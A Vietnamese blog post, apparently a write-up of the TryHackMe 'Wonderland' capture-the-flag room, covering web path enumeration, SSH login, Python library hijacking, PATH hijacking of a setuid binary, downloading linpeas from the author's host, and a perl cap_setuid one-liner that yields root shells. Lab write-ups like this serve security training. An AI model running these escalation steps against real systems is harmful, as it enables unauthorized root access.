---
layout: post
author: "Neo"
title: "Tryhackme - Wonderland"
date: "2021-11-30"
tags: [
    "tryhackme",
    "web",
    "linux",
    "ssh",
    "python library",
    "capabilities"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

Xin chào, Lẩu đây. Hôm này tôi sẽ giải CTF [Tryhackme - Wonderland](https://tryhackme.com/room/wonderland)

## Reconnaissance

Vẫn như thông thường thôi, việc đầu tiên là quét các cổng đang mở.

```python
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tôi sẽ bắt đầu với web server. 

![index.html](/assets/img/2021-11-30-THM-Wonderland/1.webp)

Chỉ là 1 trang html đơn giản. Tôi thử qua các path đơn giản và phổ biến như *robots.txt* hay thử check qua *index.php* đều không có kết quả. Vẫn phải dùng tool để tìm web path thôi, tôi sẽ dùng [dirsearch](https://github.com/maurosoria/dirsearch.git). 

`[05:44:38] 301 -    0B  - /r  ->  r/`

![path r](/assets/img/2021-11-30-THM-Wonderland/2.webp)

Cũng không có gì đặc biệt. Tôi sẽ thử 1 lần dùng dirsearch nữa để xem đằng sau path */r* này có gì không.

`[05:45:23] 301 -    0B  - /r/a  ->  a/`

![path /a](/assets/img/2021-11-30-THM-Wonderland/3.webp)

Vẫn chưa có gì để khai thác ở đây. Nhưng tôi có 1 ý tưởng về mấy cái path này, tôi sẽ thử thêm 1 lần dirsearch nữa cho chắc chắn.

`[05:56:29] 301 -    0B  - /r/a/b  ->  b/`

![path /b](/assets/img/2021-11-30-THM-Wonderland/4.webp)

Vậy thì rất có thể những path sau là các chữ cái tạo nên từ rabbit. Để tránh mất thời gian thì tôi sẽ thử luôn.

![path /b](/assets/img/2021-11-30-THM-Wonderland/5.webp)

![path /i](/assets/img/2021-11-30-THM-Wonderland/6.webp)

![path /r](/assets/img/2021-11-30-THM-Wonderland/7.webp)

Check qua source web thì tôi tìm được 1 thứ hay ho có thể là username và password để đăng nhập SSH.

```python
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="[/main.css](view-source:http://10.10.185.15/main.css)">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:***************************************</p>
    <img src="[/img/alice_door.webp](view-source:http://10.10.185.15/img/alice_door.webp)" style="height: 50rem;">
</body>
```

## SSH

Thử login ssh 

```python
┌──(neo㉿kali)-[~]
└─$ ssh alice@10.10.185.15                       
The authenticity of host '10.10.185.15 (10.10.185.15)' can't be established.
ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.185.15' (ED25519) to the list of known hosts.
alice@10.10.185.15's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 10 10:05:04 UTC 2022

  System load:  0.0                Processes:           84
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 29%                IP address for eth0: 10.10.185.15
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 
```

Trong user *alice* tôi có 2 file là *root flag* và 1 file python nhưng tất nhiên là không có quyền mở rồi. Tuy nhiên khi thử `sudo -l` tôi nhận ra user _rabbit_ có quyền chạy file py. 

```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

The sea was wet as wet could be,
The sands were dry as dry.
You could not see a cloud, because
No cloud was in the sky:
No birds were flying over head —
There were no birds to fly.

The Walrus and the Carpenter
Were walking close at hand;
They wept like anything to see
Such quantities of sand:
"If this were only cleared away,"
They said, "it would be grand!"

"If seven maids with seven mops
Swept it for half a year,
Do you suppose," the Walrus said,
"That they could get it clear?"
"I doubt it," said the Carpenter,
And shed a bitter tear.

"O Oysters, come and walk with us!"
The Walrus did beseech.
"A pleasant walk, a pleasant talk,
Along the briny beach:
We cannot do with more than four,
To give a hand to each."

The eldest Oyster looked at him.
But never a word he said:
The eldest Oyster winked his eye,
And shook his heavy head —
Meaning to say he did not choose
To leave the oyster-bed.

But four young oysters hurried up,
All eager for the treat:
Their coats were brushed, their faces washed,
Their shoes were clean and neat —
And this was odd, because, you know,
They hadn’t any feet.

Four other Oysters followed them,
And yet another four;
And thick and fast they came at last,
And more, and more, and more —
All hopping through the frothy waves,
And scrambling to the shore.

The Walrus and the Carpenter
Walked on a mile or so,
And then they rested on a rock
Conveniently low:
And all the little Oysters stood
And waited in a row.

"The time has come," the Walrus said,
"To talk of many things:
Of shoes — and ships — and sealing-wax —
Of cabbages — and kings —
And why the sea is boiling hot —
And whether pigs have wings."

"But wait a bit," the Oysters cried,
"Before we have our chat;
For some of us are out of breath,
And all of us are fat!"
"No hurry!" said the Carpenter.
They thanked him much for that.

"A loaf of bread," the Walrus said,
"Is what we chiefly need:
Pepper and vinegar besides
Are very good indeed —
Now if you’re ready Oysters dear,
We can begin to feed."

"But not on us!" the Oysters cried,
Turning a little blue,
"After such kindness, that would be
A dismal thing to do!"
"The night is fine," the Walrus said
"Do you admire the view?

"It was so kind of you to come!
And you are very nice!"
The Carpenter said nothing but
"Cut us another slice:
I wish you were not quite so deaf —
I’ve had to ask you twice!"

"It seems a shame," the Walrus said,
"To play them such a trick,
After we’ve brought them out so far,
And made them trot so quick!"
The Carpenter said nothing but
"The butter’s spread too thick!"

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

Qua google tôi biết được đây là 1 bài thơ trong phim *Alice in wonderland* cũng là cảm hứng dựng nên CTF này. Khi chạy file py này, nó sẽ chọn ngẫu nhiên 10 dòng và in ra màn hình kể cả dòng trống.

```python
alice@wonderland:~$ python3 walrus_and_the_carpenter.py 
The line was:    The Carpenter said nothing but
The line was:    Because she thought the sun
The line was:    The sun was shining on the sea,
The line was:    And scrambling to the shore.
The line was:    The Walrus did beseech.
The line was:    To give a hand to each."
The line was:    
The line was:    I’ve had to ask you twice!"
The line was:    All hopping through the frothy waves,
The line was:    Holding his pocket handkerchief
alice@wonderland:~$ 
```

## Privilege escalation

Thực sự là tôi đã mất cả 1 buổi sáng để tìm cách khai thác file py này nhưng đều không có tác dụng. Và trong khi lần mò 1 cách vô vọng trên google về các lỗ hổng với file python, tôi tìm thấy [cách leo thang đặc quyền bằng thư viện python](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/). 

Khi chạy file, python sẽ tìm đến thư mục chứa các gói được import theo thứ tự ưu tiên. Ở đây, trong thư viện của python 3.6 có file random.py nên thay vì để tập lệnh gọi file này, tôi sẽ tạo 1 file random.py chứa payload ở ngay trong thư mục *alice*.

Tạo file random.py:

```python
import os
os.system("/bin/bash")
```

Chạy lại file python với user *rabbit* xem có gì xảy ra không

```python
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
[sudo] password for alice: 
rabbit@wonderland:~$ pwd
/home/alice
```

Vào thư mục của user *rabbit*

```python
rabbit@wonderland:/home/rabbit$ ll
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 ./
drwxr-xr-x 6 root   root    4096 May 25  2020 ../
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty*
rabbit@wonderland:/home/rabbit$ file teaParty 
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```

Thử chạy file binary này

```python
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 11 Aug 2022 10:10:09 +0000
Ask very nicely, and I will give you some tea while you wait for him
kk
Segmentation fault (core dumped)
```

Tạm thời tôi chưa có ý tưởng gì về file này nên sẽ lấy nó về máy để phân tích.

```python
┌──(neo㉿kali)-[~]
└─$ wget http://10.10.165.85:8001/teaParty
--2022-08-11 05:12:17--  http://10.10.165.85:8001/teaParty
Connecting to 10.10.165.85:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16816 (16K) [application/octet-stream]
Saving to: ‘teaParty’

teaParty                                        100%[====================================================================================================>]  16.42K  52.1KB/s    in 0.3s    

2022-08-11 05:12:18 (52.1 KB/s) - ‘teaParty’ saved [16816/16816]

┌──(neo㉿kali)-[~]
└─$ strings teaParty 
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
...
```

Ở đây, để lấy được thời gian, file sẽ chạy 1 lệnh `date` nhưng không xác định địa chỉ cụ thể `date` này nằm ở đâu. Tôi hoàn toàn có thể tạo 1 file thực thi có tên `date` bên trong thư mục */tmp* 

```python
#!/bin/bash
echo ""
/bin/bash
```

Thay đổi quyền cho file bằng `chmod +x /tmp/date` và thêm path */tmp* vào đầu biến PATH để khi chạy file *teaParty* nó sẽ nhận path */tmp* đầu tiên.

```python
rabbit@wonderland:/home/rabbit$ chmod +x /tmp/date 
rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
rabbit@wonderland:/home/rabbit$ echo $PATH
/tmp:/tmp:/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by 
1337
hatter@wonderland:/home/rabbit$ 
hatter@wonderland:/home/hatter$ ls 
password.txt
```

Vậy là tôi có password của user *hatter*. Thử login ssh bằng user này. Tuy nhiên thử cả `sudo -l`, crontab hay tìm file do *hatter* sở hữu đều không có kết quả. Đến bây giờ thì phải dùng đến [linpeas](https://github.com/carlospolop/PEASS-ng.git). Tạo http server từ máy local và tải file lên thôi. Sau đó đổi quyền cho file và để nó làm phần việc của mình.

```python
hatter@wonderland:~$ wget http://10.18.3.74:9001/linpeas.sh
--2022-08-11 10:05:56--  http://10.18.3.74:9001/linpeas.sh
Connecting to 10.18.3.74:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                      100%[====================================================================================================>] 758.81K   141KB/s    in 5.4s    

2022-08-11 10:06:02 (141 KB/s) - ‘linpeas.sh’ saved [777018/777018]
hatter@wonderland:~$ chmod +x linpeas.sh 
hatter@wonderland:~$ ./linpeas.sh 
```

Cuối cùng thì tôi cũng tìm được thứ mình cần

```python
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

```python
hatter@wonderland:~$ ll /usr/bin/perl /usr/bin/perl5.26.1
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl*
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl5.26.1*
```

Điều này có nghĩa là user *hatter* có quyền thực thi cũng như quản lý nó. Thử vào [GTFOBins](https://gtfobins.github.io) để tìm perl với Capabilities.

![perl capabilities](/assets/img/2021-11-30-THM-Wonderland/8.webp)

```python
hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
# ls /root
user.txt
```

Cuối cùng là lấy *user flag* và *root flag* thì nằm trong thư mục *alice*.

## Conclusion

Tổng kết về bài thì phần thu thập thông tin cũng không có gì nhiều và tập trung chủ yếu vào việc nâng cao kỹ năng leo thang đặc quyền trên linux. Và tôi biết thêm 1 cách khai thác lỗi mới thông qua các thư viện python - __Python Library Hijacking__. Nó sẽ rất hữu ích với các tệp lệnh python được chạy với đặc quyền cao.

Ngoài ra, trong khi tìm hiểu về *SUID* và *GUID*, tôi biết thêm được 1 kiểu phân quyền nữa là *sticky bit*. Trong 1 vài trường hợp, nó cũng khá hữu ích để khai thác trong việc đọc hay ghi file với đặc quyền được chỉ định cụ thể.

Đọc thêm: [Sticky bit](https://www.thegeekstuff.com/2013/02/sticky-bit/)

Đọc thêm: [Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
